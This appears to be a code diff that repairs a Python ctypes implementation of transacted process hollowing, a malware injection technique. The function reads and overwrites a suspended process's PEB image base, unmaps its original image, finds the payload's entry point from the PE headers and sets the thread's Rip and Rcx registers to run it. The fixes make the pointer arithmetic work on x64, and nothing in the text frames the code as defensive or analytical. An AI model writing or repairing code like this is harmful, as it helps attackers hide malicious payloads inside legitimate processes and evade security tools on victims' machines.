@@ -195,7 +195,7 @@ def transacted_hollow(payload):
     # Read original image base
     originalBase=ctypes.c_void_p()
     bytesRead=ctypes.c_size_t()
-    ReadProcessMemory(pi.hProcess,ctypes.cast(pbi.PebBaseAddress,ctypes.POINTER(ctypes.c_byte))+PEB_IMAGEBASE_OFFSET,ctypes.byref(originalBase),ctypes.sizeof(ctypes.c_void_p),ctypes.byref(bytesRead))
+    ReadProcessMemory(pi.hProcess,ctypes.c_void_p(pbi.PebBaseAddress.value+PEB_IMAGEBASE_OFFSET),ctypes.byref(originalBase),ctypes.sizeof(ctypes.c_void_p),ctypes.byref(bytesRead))
     
     # Unmap original image
     NtUnmapViewOfSection(pi.hProcess,originalBase)
@@ -213,23 +213,23 @@ def transacted_hollow(payload):
         return False
     
     # Update PEB image base
-    WriteProcessMemory(pi.hProcess,ctypes.cast(pbi.PebBaseAddress,ctypes.POINTER(ctypes.c_byte))+PEB_IMAGEBASE_OFFSET,ctypes.byref(remoteBase),ctypes.sizeof(ctypes.c_void_p),None)
+    WriteProcessMemory(pi.hProcess,ctypes.c_void_p(pbi.PebBaseAddress.value+PEB_IMAGEBASE_OFFSET),ctypes.byref(remoteBase),ctypes.sizeof(ctypes.c_void_p),None)
     
     # Get entry point from PE headers
     dosHeader=ctypes.create_string_buffer(64)
     ReadProcessMemory(pi.hProcess,remoteBase,dosHeader,64,None)
     peOffset=struct.unpack('<I',dosHeader[60:64])[0]
     ntHeaders=ctypes.create_string_buffer(256)
-    ReadProcessMemory(pi.hProcess,ctypes.cast(remoteBase,ctypes.POINTER(ctypes.c_byte))+peOffset,ntHeaders,256,None)
+    ReadProcessMemory(pi.hProcess,ctypes.c_void_p(remoteBase.value+peOffset),ntHeaders,256,None)
     entryPointRVA=struct.unpack('<I',ntHeaders[24:28])[0]
-    entryPoint=ctypes.cast(remoteBase,ctypes.POINTER(ctypes.c_byte))+entryPointRVA
+    entryPoint=ctypes.c_void_p(remoteBase.value+entryPointRVA)
     
     # Update thread context (use CONTEXT_INTEGER and set Rcx for x64 entry point)
     ctx=CONTEXT()
     ctx.ContextFlags=0x10001  # CONTEXT_INTEGER
     GetThreadContext(pi.hThread,ctypes.byref(ctx))
-    ctx.Rcx=ctypes.cast(entryPoint,ctypes.c_uint64).value
-    ctx.Rip=ctypes.cast(entryPoint,ctypes.c_uint64).value
+    ctx.Rcx=entryPoint.value
+    ctx.Rip=entryPoint.value
     SetThreadContext(pi.hThread,ctypes.byref(ctx))
     
     # Resume process
